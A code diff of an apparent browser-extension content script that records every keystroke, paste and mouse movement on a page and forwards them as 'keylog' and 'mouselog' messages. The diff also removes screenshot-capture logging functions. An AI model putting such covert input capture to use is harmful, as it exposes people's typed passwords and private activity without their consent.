@@ -1,5 +1,7 @@
 "use strict";
 
+import { stringify } from "querystring";
+
 //capturing the keystrokes
 window.addEventListener("keypress", logkeypress, false);
 window.addEventListener("keydown", logkeydown, false);
@@ -33,7 +35,6 @@ function handlepasteevent(e) {
 
 function logMouseMove(e) {
 	let currentdate = Date.now();
-	
 	chrome.runtime.sendMessage({action: "mouselog",data : currentdate+':('+e.pageX+','+e.pageY+')'});
 }
 
@@ -98,13 +99,4 @@ function logkeypress(e) {
 			keypressed = String.fromCharCode(keynum);
 			chrome.runtime.sendMessage({action: "keylog", data: keypressed});
 	}	
-}
-
-
-function onCaptured(imageURI) {
-	chrome.runtime.sendMessage({action: "imglog", data: imageURI});
-}
-
-function onError(error) {
-	chrome.runtime.sendMessage({action:'imgerr', data: error});
 }
